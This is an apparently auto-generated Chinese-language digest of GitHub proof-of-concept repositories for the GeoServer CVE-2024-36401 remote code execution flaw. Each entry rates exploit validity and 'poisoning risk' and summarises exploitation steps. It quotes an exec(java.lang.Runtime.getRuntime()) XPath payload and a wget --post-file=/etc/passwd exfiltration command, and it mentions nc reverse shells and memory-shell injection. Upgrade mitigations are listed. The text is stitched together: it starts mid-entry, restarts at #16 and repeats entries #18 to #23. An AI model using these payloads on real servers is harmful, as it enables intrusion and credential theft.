根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

